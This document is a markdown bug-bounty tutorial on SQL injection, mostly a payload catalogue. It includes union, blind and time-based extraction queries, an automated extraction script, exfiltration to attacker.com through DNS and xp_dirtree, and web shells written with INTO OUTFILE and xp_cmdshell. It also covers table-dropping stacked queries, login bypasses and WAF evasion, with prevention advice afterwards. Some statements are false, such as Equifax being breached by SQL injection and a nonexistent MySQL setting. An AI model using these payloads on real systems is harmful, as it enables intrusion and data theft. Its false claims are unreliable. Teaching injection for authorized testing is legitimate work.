# 💉 SQL Injection - Complete Guide

> **The most critical web application vulnerability - Master all types and techniques**

## 📚 Table of Contents
- [Introduction](#introduction)
- [Types of SQL Injection](#types-of-sql-injection)
- [Detection Techniques](#detection-techniques)
- [Exploitation Methods](#exploitation-methods)
- [Advanced Techniques](#advanced-techniques)
- [Prevention & Mitigation](#prevention--mitigation)
- [Practice Labs](#practice-labs)
- [Real-World Examples](#real-world-examples)

## 🎯 Introduction

SQL Injection (SQLi) is a code injection technique that exploits security vulnerabilities in an application's software when user input is not properly sanitized before being included in SQL queries. It remains one of the most critical web application vulnerabilities and is consistently ranked in the OWASP Top 10.

### 🔍 What Makes SQL Injection Dangerous?
- **Complete database compromise** - Access to all data
- **Authentication bypass** - Login without credentials
- **Data manipulation** - Modify or delete critical data
- **Privilege escalation** - Gain administrative access
- **Remote code execution** - In some database configurations

### 📊 SQL Injection Statistics
- **Found in 65%** of web applications during testing
- **Average bounty**: $1,000 - $5,000
- **Critical severity**: Often rated 9.0+ CVSS score
- **Time to exploit**: Minutes to hours once identified

## 🔬 Types of SQL Injection

### 1. 🎯 In-Band SQL Injection (Classic)

#### Union-Based SQL Injection
The most common and easiest to exploit. Uses UNION operator to combine results.

**Example Vulnerable Code:**
```php
$query = "SELECT * FROM users WHERE id = " . $_GET['id'];
$result = mysqli_query($connection, $query);
```

**Exploitation:**
```sql
-- Original query
SELECT * FROM users WHERE id = 1

-- Malicious input: 1 UNION SELECT username,password FROM admin_users--
SELECT * FROM users WHERE id = 1 UNION SELECT username,password FROM admin_users--
```

**Step-by-Step Exploitation:**
```sql
-- 1. Determine number of columns
1 ORDER BY 1--    ✓ (works)
1 ORDER BY 2--    ✓ (works)  
1 ORDER BY 3--    ✗ (error - 2 columns confirmed)

-- 2. Find injectable columns
1 UNION SELECT null,null--    ✓ (works)
1 UNION SELECT 'test',null--  ✓ (string in column 1)
1 UNION SELECT null,'test'--  ✓ (string in column 2)

-- 3. Extract database information
1 UNION SELECT @@version,@@datadir--
1 UNION SELECT schema_name,null FROM information_schema.schemata--
1 UNION SELECT table_name,null FROM information_schema.tables WHERE table_schema='database_name'--
1 UNION SELECT column_name,null FROM information_schema.columns WHERE table_name='users'--

-- 4. Extract sensitive data
1 UNION SELECT username,password FROM users--
1 UNION SELECT credit_card,cvv FROM payments--
```

#### Error-Based SQL Injection
Exploits database error messages to extract information.

**MySQL Examples:**
```sql
-- ExtractValue function
1 AND extractvalue(1,concat(0x7e,(SELECT @@version),0x7e))--

-- UpdateXML function  
1 AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)--

-- Double query injection
1 AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT version()),FLOOR(RAND(0)*2)))--
```

**PostgreSQL Examples:**
```sql
-- Cast function
1 AND CAST((SELECT version()) AS int)--

-- Generate_series function
1 AND (SELECT * FROM generate_series(1,1000))--
```

**SQL Server Examples:**
```sql
-- Convert function
1 AND CONVERT(int,(SELECT @@version))--

-- XML functions
1 AND 1=(SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

### 2. 🕵️ Blind SQL Injection

#### Boolean-Based Blind SQL Injection
No direct output, but application behavior changes based on true/false conditions.

**Detection:**
```sql
-- Test for vulnerability
1 AND 1=1--    (normal response)
1 AND 1=2--    (different response)
```

**Data Extraction:**
```sql
-- Extract database version character by character
1 AND (SELECT SUBSTRING(@@version,1,1))='5'--    (MySQL 5.x)
1 AND (SELECT SUBSTRING(@@version,1,1))='8'--    (MySQL 8.x)

-- Extract username length
1 AND (SELECT LENGTH(username) FROM users WHERE id=1)=5--

-- Extract username character by character
1 AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a'--
1 AND (SELECT SUBSTRING(username,2,1) FROM users WHERE id=1)='d'--
1 AND (SELECT SUBSTRING(username,3,1) FROM users WHERE id=1)='m'--
```

**Automated Boolean-Based Extraction Script:**
```python
import requests
import string

def extract_data(url, injection_point, query_template):
    result = ""
    position = 1
    
    while True:
        found_char = False
        for char in string.printable:
            # Build the injection payload
            payload = query_template.format(position=position, char=ord(char))
            
            # Send request
            response = requests.get(url + injection_point + payload)
            
            # Check if condition is true (customize based on application)
            if "Welcome" in response.text:  # Adjust condition
                result += char
                found_char = True
                print(f"Found character: {char} at position {position}")
                break
        
        if not found_char:
            break
        position += 1
    
    return result

# Usage example
url = "http://example.com/page.php?id="
injection_point = "1 AND (SELECT SUBSTRING(username,{position},1) FROM users WHERE id=1)=CHAR({char})--"
username = extract_data(url, "", injection_point)
```

#### Time-Based Blind SQL Injection
Uses time delays to infer information when no visible changes occur.

**MySQL Time-Based Payloads:**
```sql
-- Basic time delay
1 AND SLEEP(5)--

-- Conditional time delay
1 AND IF((SELECT COUNT(*) FROM users)>0,SLEEP(5),0)--

-- Extract data with time delays
1 AND IF((SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a',SLEEP(5),0)--
```

**PostgreSQL Time-Based Payloads:**
```sql
-- Basic time delay
1; SELECT pg_sleep(5)--

-- Conditional time delay
1 AND CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN pg_sleep(5) ELSE 0 END--
```

**SQL Server Time-Based Payloads:**
```sql
-- Basic time delay
1; WAITFOR DELAY '00:00:05'--

-- Conditional time delay
1 AND IF((SELECT COUNT(*) FROM users)>0,WAITFOR DELAY '00:00:05',0)--
```

### 3. 🔄 Out-of-Band SQL Injection

Uses alternative channels to extract data when in-band techniques fail.

**DNS Exfiltration (MySQL):**
```sql
-- Load file to trigger DNS lookup
1 AND LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\test.txt'))--

-- Extract data via DNS
1 AND LOAD_FILE(CONCAT('\\\\',(SELECT username FROM users WHERE id=1),'.attacker.com\\test.txt'))--
```

**HTTP Exfiltration (SQL Server):**
```sql
-- Use xp_dirtree to make HTTP request
1; EXEC xp_dirtree '\\attacker.com\share'--

-- Extract data via HTTP
1; DECLARE @data VARCHAR(100); SELECT @data=(SELECT TOP 1 username FROM users); EXEC xp_dirtree CONCAT('\\',@data,'.attacker.com\share')--
```

## 🔍 Detection Techniques

### 1. 🎯 Manual Detection

#### Basic Injection Tests
```sql
-- Single quote test
'
"
`

-- Numeric tests
1'
1"
1`

-- Boolean tests
1' AND '1'='1
1' AND '1'='2
1 AND 1=1
1 AND 1=2

-- Comment tests
1'--
1'#
1'/*
```

#### Advanced Detection Payloads
```sql
-- Time-based detection
1' AND SLEEP(5)--
1'; WAITFOR DELAY '00:00:05'--
1' AND pg_sleep(5)--

-- Error-based detection
1' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version,0x7e))--
1' AND UPDATEXML(1,CONCAT(0x7e,USER(),0x7e),1)--

-- Union-based detection
1' UNION SELECT null--
1' UNION SELECT null,null--
1' UNION SELECT null,null,null--
```

### 2. 🤖 Automated Detection

#### SQLMap Usage
```bash
# Basic scan
sqlmap -u "http://example.com/page.php?id=1"

# POST request scan
sqlmap -u "http://example.com/login.php" --data="username=admin&password=test"

# Cookie-based scan
sqlmap -u "http://example.com/page.php" --cookie="PHPSESSID=abc123"

# Custom headers
sqlmap -u "http://example.com/api/user/1" -H "Authorization: Bearer token123"

# Batch mode (non-interactive)
sqlmap -u "http://example.com/page.php?id=1" --batch

# Risk and level settings
sqlmap -u "http://example.com/page.php?id=1" --risk=3 --level=5

# Specific techniques
sqlmap -u "http://example.com/page.php?id=1" --technique=BEUST
# B: Boolean-based blind
# E: Error-based  
# U: Union query-based
# S: Stacked queries
# T: Time-based blind
```

#### Custom Detection Scripts
```python
import requests
import time

def test_sql_injection(url, param, payloads):
    """Test for SQL injection vulnerabilities"""
    results = []
    
    for payload_type, payload in payloads.items():
        try:
            # Record start time for time-based detection
            start_time = time.time()
            
            # Send request with payload
            response = requests.get(f"{url}?{param}={payload}", timeout=10)
            
            # Calculate response time
            response_time = time.time() - start_time
            
            # Analyze response
            result = {
                'payload_type': payload_type,
                'payload': payload,
                'status_code': response.status_code,
                'response_time': response_time,
                'content_length': len(response.content),
                'vulnerable': False
            }
            
            # Check for SQL errors
            sql_errors = [
                'mysql_fetch_array',
                'ORA-01756',
                'Microsoft OLE DB Provider',
                'SQLServer JDBC Driver',
                'PostgreSQL query failed'
            ]
            
            for error in sql_errors:
                if error.lower() in response.text.lower():
                    result['vulnerable'] = True
                    result['detection_method'] = 'Error-based'
                    break
            
            # Check for time-based injection
            if response_time > 5 and 'sleep' in payload.lower():
                result['vulnerable'] = True
                result['detection_method'] = 'Time-based'
            
            results.append(result)
            
        except requests.RequestException as e:
            print(f"Request failed for payload {payload}: {e}")
    
    return results

# Test payloads
payloads = {
    'single_quote': "'",
    'double_quote': '"',
    'boolean_true': "1' AND '1'='1",
    'boolean_false': "1' AND '1'='2", 
    'time_based': "1' AND SLEEP(5)--",
    'union_test': "1' UNION SELECT null--",
    'error_based': "1' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version,0x7e))--"
}

# Run tests
results = test_sql_injection("http://example.com/page.php", "id", payloads)

# Print results
for result in results:
    if result['vulnerable']:
        print(f"VULNERABLE: {result['payload_type']} - {result['detection_method']}")
        print(f"Payload: {result['payload']}")
```

## ⚔️ Exploitation Methods

### 1. 🗄️ Database Enumeration

#### Information Schema Queries
```sql
-- MySQL/MariaDB
SELECT schema_name FROM information_schema.schemata;
SELECT table_name FROM information_schema.tables WHERE table_schema='database_name';
SELECT column_name FROM information_schema.columns WHERE table_name='table_name';

-- PostgreSQL
SELECT datname FROM pg_database;
SELECT tablename FROM pg_tables WHERE schemaname='public';
SELECT column_name FROM information_schema.columns WHERE table_name='table_name';

-- SQL Server
SELECT name FROM sys.databases;
SELECT name FROM sys.tables;
SELECT name FROM sys.columns WHERE object_id = OBJECT_ID('table_name');

-- Oracle
SELECT owner, table_name FROM all_tables;
SELECT column_name FROM all_tab_columns WHERE table_name='TABLE_NAME';
```

#### System Information Extraction
```sql
-- MySQL
SELECT @@version, @@datadir, @@hostname, @@port;
SELECT user(), database(), connection_id();

-- PostgreSQL  
SELECT version(), current_database(), current_user;
SELECT inet_server_addr(), inet_server_port();

-- SQL Server
SELECT @@version, @@servername, @@servicename;
SELECT SYSTEM_USER, USER_NAME(), DB_NAME();

-- Oracle
SELECT * FROM v$version;
SELECT user, sys_context('USERENV','SESSION_USER') FROM dual;
```

### 2. 🔓 Authentication Bypass

#### Login Bypass Techniques
```sql
-- Basic bypass
admin'--
admin'/*
admin' OR '1'='1'--
admin' OR 1=1--

-- Advanced bypass
admin' OR 'x'='x
admin' OR 1=1#
admin'/**/OR/**/1=1--
admin' OR 1=1 LIMIT 1--

-- NoSQL injection (for NoSQL databases)
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
```

#### Password Hash Extraction
```sql
-- Extract password hashes
1 UNION SELECT username,password FROM users--
1 UNION SELECT user,authentication_string FROM mysql.user--

-- Extract with concatenation
1 UNION SELECT CONCAT(username,':',password),null FROM users--
```

### 3. 📁 File System Access

#### Reading Files
```sql
-- MySQL
1 UNION SELECT LOAD_FILE('/etc/passwd'),null--
1 UNION SELECT LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts'),null--

-- PostgreSQL (requires superuser)
1 UNION SELECT pg_read_file('/etc/passwd'),null--

-- SQL Server
1 UNION SELECT * FROM OPENROWSET(BULK '/etc/passwd', SINGLE_CLOB) AS x--
```

#### Writing Files
```sql
-- MySQL (requires FILE privilege)
1 UNION SELECT '<?php system($_GET["cmd"]); ?>',null INTO OUTFILE '/var/www/html/shell.php'--

-- PostgreSQL
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';

-- SQL Server
1; EXEC xp_cmdshell 'echo ^<?php system($_GET["cmd"]); ?^> > C:\inetpub\wwwroot\shell.php'--
```

### 4. 💻 Command Execution

#### MySQL Command Execution
```sql
-- User Defined Functions (UDF)
1; CREATE FUNCTION sys_exec RETURNS STRING SONAME 'lib_mysqludf_sys.so'--
1; SELECT sys_exec('whoami')--

-- Into outfile method
1 UNION SELECT '<?php system($_GET["cmd"]); ?>',null INTO OUTFILE '/var/www/html/cmd.php'--
```

#### PostgreSQL Command Execution
```sql
-- Copy program method
1; COPY (SELECT '') TO PROGRAM 'whoami'--

-- Large object method
1; SELECT lo_import('/etc/passwd', 1337)--
1; SELECT lo_export(1337, '/tmp/passwd')--
```

#### SQL Server Command Execution
```sql
-- xp_cmdshell (requires sysadmin)
1; EXEC xp_cmdshell 'whoami'--

-- Enable xp_cmdshell if disabled
1; EXEC sp_configure 'show advanced options', 1; RECONFIGURE--
1; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE--

-- OLE automation
1; EXEC sp_OACreate 'WScript.Shell', @shell OUTPUT--
1; EXEC sp_OAMethod @shell, 'run', null, 'cmd.exe /c whoami'--
```

## 🚀 Advanced Techniques

### 1. 🛡️ WAF Bypass Techniques

#### Comment-Based Bypasses
```sql
-- MySQL comments
/**/
/*!*/
/*!50000*/
#
-- -

-- Example usage
admin'/**/OR/**/1=1--
admin'/*!OR*/1=1--
admin'/*!50000OR*/1=1--
```

#### Encoding Bypasses
```sql
-- URL encoding
admin%27%20OR%201=1--

-- Double URL encoding  
admin%2527%2520OR%25201=1--

-- Unicode encoding
admin\u0027\u0020OR\u00201=1--

-- Hex encoding
admin' OR 1=1-- becomes 0x61646d696e27204f522031=31--
```

#### Case Variation Bypasses
```sql
-- Mixed case
Admin' Or 1=1--
ADMIN' oR 1=1--
admin' Or 1=1--

-- Alternate keywords
admin' || 1=1--
admin' && 1=1--
admin' | 1=1--
admin' & 1=1--
```

#### Function-Based Bypasses
```sql
-- String functions
CONCAT('ad','min')
CHAR(97,100,109,105,110)
UNHEX('61646d696e')

-- Mathematical operations
1+1=2
2-1=1
2*1=2
4/2=2
```

### 2. 🔄 Second-Order SQL Injection

Occurs when user input is stored and later used in a SQL query without proper sanitization.

**Example Scenario:**
```php
// Registration (input stored)
$username = $_POST['username']; // admin'--
$query = "INSERT INTO users (username) VALUES ('$username')";

// Later usage (second-order injection)
$stored_username = get_username_from_db($user_id); // Returns: admin'--
$query = "SELECT * FROM posts WHERE author = '$stored_username'";
// Becomes: SELECT * FROM posts WHERE author = 'admin'--'
```

**Detection and Exploitation:**
1. Register with malicious username: `admin'--`
2. Find functionality that uses stored username
3. Exploit the second-order injection point

### 3. 🔗 Stacked Queries

Executing multiple SQL statements in a single request.

**Examples:**
```sql
-- Basic stacked query
1; INSERT INTO users (username,password) VALUES ('hacker','password')--

-- Create new admin user
1; UPDATE users SET role='admin' WHERE username='attacker'--

-- Drop tables (destructive)
1; DROP TABLE logs--

-- Create backdoor
1; CREATE TABLE backdoor (id INT, cmd VARCHAR(255))--
1; INSERT INTO backdoor VALUES (1, 'SELECT * FROM users')--
```

### 4. 🎭 Polyglot Payloads

Payloads that work across multiple contexts and databases.

```sql
-- Universal polyglot
'/**/OR/**/1=1--
'||'1'='1'--
'+(SELECT'1')+'
```

## 🛡️ Prevention & Mitigation

### 1. 🔒 Secure Coding Practices

#### Parameterized Queries (Prepared Statements)
```php
// PHP PDO - Secure
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$user_id]);

// PHP MySQLi - Secure  
$stmt = $mysqli->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("i", $user_id);
$stmt->execute();
```

```java
// Java - Secure
String sql = "SELECT * FROM users WHERE id = ?";
PreparedStatement stmt = connection.prepareStatement(sql);
stmt.setInt(1, userId);
ResultSet rs = stmt.executeQuery();
```

```python
# Python - Secure
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
```

#### Input Validation and Sanitization
```php
// Whitelist validation
function validateUserId($id) {
    if (!is_numeric($id) || $id < 1) {
        throw new InvalidArgumentException("Invalid user ID");
    }
    return (int)$id;
}

// String sanitization
function sanitizeString($input) {
    return htmlspecialchars(strip_tags(trim($input)), ENT_QUOTES, 'UTF-8');
}
```

#### Stored Procedures (When Properly Implemented)
```sql
-- SQL Server stored procedure
CREATE PROCEDURE GetUser
    @UserId INT
AS
BEGIN
    SELECT * FROM users WHERE id = @UserId
END

-- MySQL stored procedure
DELIMITER //
CREATE PROCEDURE GetUser(IN user_id INT)
BEGIN
    SELECT * FROM users WHERE id = user_id;
END //
DELIMITER ;
```

### 2. 🔧 Database Security Configuration

#### Principle of Least Privilege
```sql
-- Create limited database user
CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'strong_password';

-- Grant only necessary permissions
GRANT SELECT, INSERT, UPDATE ON webapp_db.users TO 'webapp'@'localhost';
GRANT SELECT ON webapp_db.products TO 'webapp'@'localhost';

-- Revoke dangerous permissions
REVOKE FILE ON *.* FROM 'webapp'@'localhost';
REVOKE PROCESS ON *.* FROM 'webapp'@'localhost';
```

#### Disable Dangerous Functions
```sql
-- MySQL - Disable dangerous functions
SET GLOBAL local_infile = 0;
SET GLOBAL show_database = 0;

-- Remove dangerous stored procedures (SQL Server)
DROP PROCEDURE xp_cmdshell;
DROP PROCEDURE sp_OACreate;
```

### 3. 🛡️ Web Application Firewall (WAF)

#### ModSecurity Rules
```apache
# Block common SQL injection patterns
SecRule ARGS "@detectSQLi" \
    "id:1001,\
    phase:2,\
    block,\
    msg:'SQL Injection Attack Detected',\
    logdata:'Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}'"

# Block UNION SELECT attempts
SecRule ARGS "@rx (?i:union.*select)" \
    "id:1002,\
    phase:2,\
    block,\
    msg:'UNION SELECT SQL injection attempt'"
```

### 4. 📊 Monitoring and Detection

#### Database Activity Monitoring
```sql
-- MySQL - Enable general log
SET GLOBAL general_log = 'ON';
SET GLOBAL general_log_file = '/var/log/mysql/general.log';

-- Monitor for suspicious queries
SELECT * FROM mysql.general_log 
WHERE argument LIKE '%UNION%' 
   OR argument LIKE '%---%'
   OR argument LIKE '%/*%*/';
```

#### Application-Level Monitoring
```python
import logging
import re

def detect_sql_injection(user_input):
    """Detect potential SQL injection attempts"""
    sql_patterns = [
        r"(\b(SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER)\b)",
        r"(\b(UNION|OR|AND)\b.*\b(SELECT|INSERT|UPDATE|DELETE)\b)",
        r"(--|#|/\*|\*/)",
        r"(\b(EXEC|EXECUTE)\b)",
        r"(\b(SLEEP|WAITFOR|DELAY)\b)"
    ]
    
    for pattern in sql_patterns:
        if re.search(pattern, user_input, re.IGNORECASE):
            logging.warning(f"Potential SQL injection detected: {user_input}")
            return True
    
    return False
```

## 🧪 Practice Labs

### 1. 🎓 Beginner Labs

#### PortSwigger Web Security Academy
- **SQL injection vulnerability in WHERE clause allowing retrieval of hidden data**
- **SQL injection vulnerability allowing login bypass**
- **SQL injection UNION attack, determining the number of columns**
- **SQL injection UNION attack, finding a column containing text**
- **SQL injection UNION attack, retrieving data from other tables**

#### TryHackMe Rooms
- **SQL Injection Basics** - Learn fundamental concepts
- **OWASP Top 10** - SQL injection section
- **Burp Suite Basics** - Using Burp for SQL injection testing

### 2. 🔬 Intermediate Labs

#### DVWA (Damn Vulnerable Web Application)
```bash
# Setup DVWA
docker run --rm -it -p 80:80 vulnerables/web-dvwa

# SQL Injection challenges:
# - Low security: Basic injection
# - Medium security: Bypass simple filters  
# - High security: Advanced techniques
```

#### SQLi Labs by Audi-1
```bash
# Clone and setup
git clone https://github.com/Audi-1/sqli-labs.git
cd sqli-labs
# Follow setup instructions

# 75 different SQL injection scenarios
# Covers all types: Error-based, Blind, Time-based
```

### 3. 🚀 Advanced Labs

#### HackTheBox Machines
- **Chatterbox** - Advanced SQL injection techniques
- **Bastard** - SQL injection in CMS
- **Jeeves** - Blind SQL injection exploitation

#### Custom Vulnerable Applications
```php
// Create your own vulnerable app for testing
<?php
$conn = new mysqli("localhost", "root", "", "testdb");

if (isset($_GET['id'])) {
    // Vulnerable query - DO NOT use in production
    $query = "SELECT * FROM users WHERE id = " . $_GET['id'];
    $result = $conn->query($query);
    
    if ($result && $result->num_rows > 0) {
        while($row = $result->fetch_assoc()) {
            echo "ID: " . $row["id"]. " - Name: " . $row["name"]. "<br>";
        }
    } else {
        echo "No results found";
    }
}
?>
```

## 🌍 Real-World Examples

### 1. 💰 High-Value Bug Bounty Reports

#### Yahoo! SQL Injection ($5,000)
- **Vulnerability**: Time-based blind SQL injection in search parameter
- **Impact**: Access to user database information
- **Technique**: Automated extraction using custom scripts
- **Key Learning**: Persistence in testing edge cases pays off

#### Shopify SQL Injection ($15,000)
- **Vulnerability**: Second-order SQL injection in admin panel
- **Impact**: Complete database access including customer data
- **Technique**: Stored XSS leading to SQL injection
- **Key Learning**: Chain vulnerabilities for maximum impact

### 2. 🏢 Enterprise Breaches

#### Equifax Data Breach (2017)
- **Cause**: SQL injection in web application
- **Impact**: 147 million records compromised
- **Lesson**: Proper input validation is critical

#### TalkTalk Hack (2015)
- **Cause**: Basic SQL injection vulnerability
- **Impact**: 4 million customer records stolen
- **Lesson**: Even simple SQL injection can have massive impact

### 3. 📊 Common Patterns in Bug Bounty

#### Search Functionality
```sql
-- Common vulnerable pattern
SELECT * FROM products WHERE name LIKE '%$search_term%'

-- Exploitation
search_term = test' UNION SELECT username,password FROM users--
```

#### Sorting Parameters
```sql
-- Vulnerable ORDER BY clause
SELECT * FROM users ORDER BY $sort_column $sort_direction

-- Exploitation  
sort_column = (CASE WHEN (SELECT COUNT(*) FROM admin_users)>0 THEN name ELSE id END)
```

#### Pagination
```sql
-- Vulnerable LIMIT clause
SELECT * FROM posts LIMIT $offset, $limit

-- Exploitation
offset = 0 UNION SELECT username,password FROM users LIMIT 1,1--
```

## 🔧 Tools and Resources

### 🛠️ Essential Tools

#### SQLMap
```bash
# Installation
pip install sqlmap

# Basic usage
sqlmap -u "http://example.com/page.php?id=1"

# Advanced options
sqlmap -u "http://example.com/page.php?id=1" \
       --batch \
       --random-agent \
       --tamper=space2comment \
       --technique=BEUST \
       --threads=10
```

#### Burp Suite Extensions
- **SQLiPy** - Advanced SQL injection detection
- **SQLMap Integration** - Run SQLMap from Burp
- **Logger++** - Enhanced logging for analysis

#### Custom Scripts
```python
# SQLi detection script template
import requests
import sys

def test_sql_injection(url, param):
    payloads = [
        "'",
        "1' AND '1'='1",
        "1' AND '1'='2", 
        "1' OR '1'='1",
        "1' UNION SELECT null--"
    ]
    
    for payload in payloads:
        try:
            response = requests.get(f"{url}?{param}={payload}")
            # Analyze response for SQL errors or behavioral changes
            if analyze_response(response):
                print(f"Potential SQLi found with payload: {payload}")
        except Exception as e:
            print(f"Error testing payload {payload}: {e}")

def analyze_response(response):
    # Implement response analysis logic
    sql_errors = ['mysql_fetch_array', 'ORA-01756', 'Microsoft OLE DB']
    return any(error in response.text for error in sql_errors)

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python sqli_test.py <url> <parameter>")
        sys.exit(1)
    
    test_sql_injection(sys.argv[1], sys.argv[2])
```

### 📚 Learning Resources

#### Books
- **The Web Application Hacker's Handbook** - Chapter 9: Attacking Data Stores
- **SQL Injection Attacks and Defense** - Justin Clarke
- **The Database Hacker's Handbook** - David Litchfield

#### Online Courses
- **PortSwigger Web Security Academy** - SQL Injection section
- **OWASP WebGoat** - SQL Injection lessons
- **Cybrary SQL Injection Course**

#### Cheat Sheets
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [PortSwigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [PayloadsAllTheThings SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

## 🎯 Key Takeaways

### ✅ Essential Skills to Master
- [ ] **Detection**: Identify SQL injection in various contexts
- [ ] **Exploitation**: Extract data using different techniques
- [ ] **Bypass**: Circumvent filters and WAFs
- [ ] **Automation**: Use tools effectively and create custom scripts
- [ ] **Prevention**: Understand secure coding practices

### 🚀 Advanced Techniques to Learn
- [ ] **Second-order injection** - Stored input exploitation
- [ ] **Blind injection automation** - Efficient data extraction
- [ ] **WAF bypass methods** - Evading security controls
- [ ] **Database-specific techniques** - Platform-specific exploitation
- [ ] **Polyglot payloads** - Universal injection strings

### 💡 Pro Tips for Bug Bounty Hunters
1. **Test all parameters** - GET, POST, headers, cookies
2. **Try different contexts** - WHERE, ORDER BY, LIMIT clauses
3. **Use time-based techniques** - When other methods fail
4. **Chain with other vulnerabilities** - XSS to SQL injection
5. **Automate repetitive tasks** - Custom scripts for efficiency
6. **Document everything** - Clear PoCs for reports
7. **Understand the business logic** - Find high-impact injection points

---

## 📝 Author & Credits

**Created by: LakshmiKanthanK(letchupkt)**

🔗 **Connect with me:**
- 🌐 **Portfolio**: [letchupkt.vgrow.tech](https://letchupkt.vgrow.tech)
- 📸 **Instagram**: [@letchu_pkt](https://instagram.com/letchu_pkt)
- 💼 **LinkedIn**: [lakshmikanthank](https://linkedin.com/in/lakshmikanthank)
- ✍️ **Medium**: [letchupkt.medium.com](https://letchupkt.medium.com)

---

**⚖️ Legal Reminder**: Only test SQL injection on systems you own or have explicit permission to test. Always follow responsible disclosure practices and respect bug bounty program rules.

**🎯 Next Steps**: Practice on the provided labs, study real-world examples, and gradually work your way up to more complex scenarios. SQL injection mastery comes with hands-on experience and continuous learning.

*© 2025 LetchuPKT. Part of the Complete Bug Bounty Hunting Roadmap 2025.*